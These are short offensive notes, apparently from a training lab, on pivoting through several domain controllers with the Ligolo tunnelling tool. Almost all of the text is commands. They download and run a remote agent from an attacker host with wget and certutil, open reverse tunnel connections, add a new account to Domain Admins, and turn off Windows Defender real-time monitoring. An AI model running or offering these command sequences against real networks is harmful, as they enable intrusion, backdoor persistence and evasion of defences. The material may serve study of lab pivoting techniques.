# NIX01

```
//Prepare the NIC on my machine
sudo ip tuntap add user millycash mode tun ligolo;
sudo ip link set ligolo up;
sudo ip route add 172.16.1.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:8443


//Uploading and connecting back the to the proxy
cd /tmp;wget http://10.10.14.5:8081/agent;chmod +x /tmp/agent
./agent -connect 10.10.14.5:8443 -ignore-cert &

//Adding the listeners on ligolo proxy
listener_add --addr 0.0.0.0:8081 --to 127.0.0.1:8081 --tcp
```

&nbsp;

# DC01.CORP.LOCAL

```
//Adding a new DA
net user yovecio yovecio /add /domain
net group "Domain Admins" yovecio /add /domain
Set-MpPreference -DisableRealtimeMonitoring $true


//Preparing the Ligolo
sudo ip tuntap add user millycash mode tun ligolo2;
sudo ip link set ligolo2 up;
sudo ip route add 172.16.2.0/24 dev ligolo2;
sudo ip route add 172.16.3.0/24 dev ligolo2

//Connecting the Ligolo
certutil.exe -urlcache -f http://10.10.14.5:8081/agent.exe agent.exe
Start-Job -name Ligolo { C:\temp\agent.exe -connect 10.10.14.5:8443 -ignore-cert }

//Inside ligolo
listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443 --tcp
```

&nbsp;

# DC03.ADMIN.OFFSHORE.COM

```
//Adding a new DA
net user yovecio Coglione1! /add /domain
net group "Domain Admins" yovecio /add /domain
Set-MpPreference -DisableRealtimeMonitoring $true


//Preparing Ligolo
sudo ip tuntap add user millycash mode tun ligolo3;
sudo ip link set ligolo3 up;
sudo ip route add 172.16.4.0/24 dev ligolo3


//Spinning-up the connection
wget http://10.10.14.5:8081/agent.exe -outfile C:\Temp\agent.exe
Start-Job -name Ligolo { C:\temp\agent.exe -connect 10.10.14.5:8443 -ignore-cert }
```

&nbsp;

# DC04.ADMIN.OFFSHORE.COM

```
//Adding a new DA
net user yovecio Coglione1! /add /domain
net group "Domain Admins" yovecio /add /domain


//Preparing Ligolo
sudo ip tuntap add user millycash mode tun ligolo4;
sudo ip link set ligolo4 up;


//Spinning-up the connection
wget http://10.10.14.5:8081/agent.exe -outfile C:\Temp\agent.exe
Start-Job -name Ligolo { C:\temp\agent.exe -connect 10.10.14.5:8443 -ignore-cert }

//Adjusting the routes
sudo ip route delete 172.16.4.0/24;                
sudo ip route add 172.16.4.0/24 dev ligolo4;
```